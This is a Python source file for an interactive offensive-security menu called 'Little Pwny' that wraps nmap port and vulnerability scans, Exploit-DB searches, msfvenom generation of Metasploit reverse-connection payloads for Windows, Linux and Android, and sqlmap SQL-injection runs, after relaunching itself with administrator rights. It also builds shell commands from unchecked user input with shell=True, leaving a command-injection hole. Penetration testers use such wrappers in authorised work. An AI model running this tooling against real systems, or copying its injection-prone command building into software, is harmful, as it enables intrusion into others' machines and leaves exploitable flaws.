import os
import subprocess
import webbrowser
import sys
import ctypes
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style

# Define menu style
style = Style.from_dict({
    'menu': '#FF69B4 bold',
    'option': '#00FF00',
})

SQLMAP_PATH = r"C:\sqlmap\sqlmapproject-sqlmap-29825cd\sqlmap.py"

def is_admin():
    """Check if the script is running as admin/root."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows-specific check
    except AttributeError:
        return False  # Fallback for non-Windows systems

def request_admin_privileges():
    """Request admin privileges via UAC."""
    if not is_admin():
        print("Requesting administrative privileges...")
        # Relaunch the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

def open_exploit_db(keyword):
    """Open Exploit-DB in the default web browser with the specified keyword."""
    url = f"https://www.exploit-db.com/search?q={keyword}"
    webbrowser.open(url)
    return f"Opening Exploit-DB in your web browser with search term: {keyword}"

def run_nmap_scan(target, scan_type='syn'):
    """Run Nmap scans."""
    scan_types = {
        'syn': '-sS -T4',
        'tcp': '-sT -T4',
        'udp': '-sU -T3',
        'vuln': '-sV --script=vulners'
    }
    command = f"nmap {scan_types.get(scan_type, '')} {target}"
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    return process.communicate()[0].decode()

def generate_payload(payload_type, lhost, lport):
    """Generate Metasploit payloads using msfvenom."""
    formats = {
        'windows': 'exe',
        'linux': 'elf',
        'android': 'apk'
    }
    output_file = os.path.abspath(f"payload.{formats.get(payload_type.split('/')[0], 'bin')}")
    command = (
        f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} "
        f"-f {formats.get(payload_type.split('/')[0], 'raw')} -o {output_file}"
    )
    try:
        subprocess.run(command, shell=True, check=True)
        return f"Payload generated at: {output_file}"
    except Exception as e:
        return f"Error generating payload: {str(e)}"

def run_sqlmap(target_url, options=""):
    """Run SQLMap scans."""
    command = f'python "{SQLMAP_PATH}" -u "{target_url}" {options}'
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output, _ = process.communicate()
        return output.decode()
    except Exception as e:
        return f"Error running SQLMap: {str(e)}"

def main_menu():
    """Interactive menu for the tool."""
    print(r"""
        ~~
       (o o)
   /----\_/
  / |    \
 *  ||----||
    ^^    ^^
Welcome to Little Pwny!
""")
    
    while True:
        user_input = prompt([
            ('class:menu', 'LittlePwny> '),
            ('class:option', '')
        ], style=style)
        
        if user_input.startswith('exploitdb'):
            keyword = user_input.split(maxsplit=1)[1]
            print(open_exploit_db(keyword))
        
        elif user_input.startswith('nmap'):
            args = user_input.split()
            target = args[1]
            scan_type = args[2] if len(args) > 2 else 'syn'
            print(run_nmap_scan(target, scan_type))
        
        elif user_input.startswith('payload'):
            try:
                _, ptype, lhost, lport = user_input.split()
                print(generate_payload(ptype, lhost, lport))
            except ValueError:
                print("Usage: payload <type> <LHOST> <LPORT>")
        
        elif user_input.startswith('sqlmap'):
            try:
                args = user_input.split(maxsplit=2)
                target_url = args[1]
                options = args[2] if len(args) > 2 else ""
                print(run_sqlmap(target_url, options))
            except ValueError:
                print("Usage: sqlmap <URL> [options]")
        
        elif user_input.lower() == 'exit':
            print("Goodbye!")
            break
        
        else:
            print("Unknown command. Try: exploitdb <keyword>, nmap <target> <scan_type>, payload <type> <LHOST> <LPORT>, or sqlmap <URL> [options].")

if __name__ == "__main__":
    request_admin_privileges()  # Ensure the script runs with admin privileges
    main_menu()
